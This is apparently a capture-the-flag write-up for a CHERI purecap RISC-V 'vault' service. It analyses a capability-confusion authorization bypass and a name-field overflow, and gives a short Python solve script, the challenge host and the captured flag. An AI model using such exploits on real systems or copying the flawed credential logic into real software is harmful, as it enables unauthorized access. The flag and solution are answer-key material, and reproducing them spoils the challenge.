---
title: "PWN#Zeta"
category: "Pwn"
tags: ["cheri", "purecap", "riscv", "capability-confusion", "freebsd", "cheribsd", "vault"]
solve_date: "2026-11-04T11:20:00+07:00"
language: "en"
points: 130
---

# PWN#Zeta — CHERI purecap vault credential confusion

**Flag:** `CTF{5429e37a657bad87823e1268693a5a59}`  
**Service:** `169.58.126.107:5012`  
**Flag format:** `CTF{...}`

| Artifact | Bytes | SHA-256 |
|---|---:|---|
| `vault` (CheriBSD / FreeBSD 15, RISC-V CHERI purecap) | 12,904 | `7e5f0f6740269db2f12a30ded2e89a25a12dd9891a36cb0042bbb7bb749d6d3a` |

## Challenge

> PWN#Zeta — 130 points. Get the vault to grant `ACCESS GRANTED`.

The handout is a stripped ELF64 RISC-V executable built for the CHERI purecap ABI (`UCB RISC-V, RVC, double-float ABI`, interpreter `/libexec/ld-elf.so.1`, FreeBSD 15 / CheriBSD). The service is a small line-oriented menu: a cosmetic profile section (`create`, `link`, `rename`, `destroy`) and a vault section (`preview`, `scratch`, `open`).

## Analysis

### Handout

`file` identifies the target as a purecap CHERI binary:

```
ELF 64-bit LSB pie executable, UCB RISC-V, RVC, double-float ABI,
version 1 (SYSV), dynamically linked, interpreter /libexec/ld-elf.so.1,
for FreeBSD 15.0 (1500040), FreeBSD-style, stripped
```

`strings` recovers the menu and, more importantly, the messages around the vault:

```
handle %d created (preview credential, level=%lu)
scratch credential set (level=%lu, not saved anywhere)
ACCESS GRANTED: %s
access denied (level=%lu)
dangling capability, denied
corrupt handle
flag.txt
```

The binary is PIE and stripped, and `.text` is only `0x888` bytes. It imports `malloc`/`free`, `fgets`/`fread`, `printf`/`puts`, `strtoul`/`atoi`, and `fopen`/`fclose`. Mainstream binutils and Ghidra do not decode the `xcheri` instructions, but instruction-level reversing is not required for this bug.

### Menu behaviour

Feeding the menu over the socket maps the object model:

| Command | Behaviour |
|---|---|
| `[1] create_profile <name>` | allocates a profile: `char name[24]` followed by `uint64_t tier = 1` |
| `[2] link_profile <id>` | always answers `not vault-linkable (cosmetic only)` for these profiles |
| `[3] rename_profile <id>` | reads a raw line and writes up to 32 bytes into `name` |
| `[4] destroy_profile <id>` | frees the profile |
| `[5] vault_preview` | allocates a handle backed by a *preview credential*, `level=1` |
| `[6] vault_scratch <level>` | creates a *scratch credential* with an attacker-chosen level |
| `[7] vault_open <id>` | checks the credential and reads `flag.txt` |
| `[8] debug_dump_profile <id>` | decoy, prints `name=%.24s tier=%lu` |

`rename_profile` has an obvious overflow: the prompt says "up to 24 bytes", but 32 bytes land in the profile, so the `tier` field at offset 24 is fully controlled. `debug_dump_profile` confirms it (`tier=3735928559` after writing `0xdeadbeef`). It is a real bug, but it is not needed to win.

### The vault bug

Two probes isolate the authorization logic:

```
[5] vault_preview          -> handle 0 created (preview credential, level=1)
[7] vault_open 0           -> access denied (level=1)
```

```
[5] vault_preview          -> handle 0 created (preview credential, level=1)
[6] vault_scratch 0        -> scratch credential set (level=0, not saved anywhere)
[7] vault_open 0           -> ACCESS GRANTED: CTF{...}
```

Every scratch level works — `0`, `1`, `2`, `5`, `10`, `100` all grant — and any existing handle id can be opened. The handle id still has to exist (`vault_open 5` answers `bad handle`), so the handle-table lookup happens first. The order matters too:

```
[6] vault_scratch 7        -> scratch credential set (level=7, not saved anywhere)
[5] vault_preview          -> handle 0 created (preview credential, level=1)
[7] vault_open 0           -> access denied (level=1)
```

`vault_preview` overwrites the same global slot that `vault_scratch` writes, which is why the scratch credential has to be installed *after* a handle exists.

Root cause: `vault_scratch` publishes a capability to a transient scratch credential into a global "current credential" slot. `vault_open` validates the handle id, then uses that global credential instead of the handle's own credential and treats it as authenticated without applying the level check. The credential is explicitly described as "not saved anywhere" — it was never meant to outlive the call — but the global reference keeps it reachable. This is a capability-confusion bug: a temporary capability becomes an authorization token, and the CHERI bounds and tag checks do not help because the capability is genuinely valid for the object it points to.

## Exploit

The whole exploit is three menu commands, in this order:

```python
#!/usr/bin/env python3
import re, socket

HOST, PORT = "169.58.126.107", 5012

s = socket.create_connection((HOST, PORT), timeout=5)
s.sendall(b"5\n6\n0\n7\n0\n")      # preview -> scratch 0 -> open handle 0

data = b""
s.settimeout(3)
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
except socket.timeout:
    pass

print(re.search(rb"CTF\{[0-9a-f]+\}", data).group().decode())
```

```
$ python3 solve.py
CTF{5429e37a657bad87823e1268693a5a59}
```

## Flag

```
CTF{5429e37a657bad87823e1268693a5a59}
```
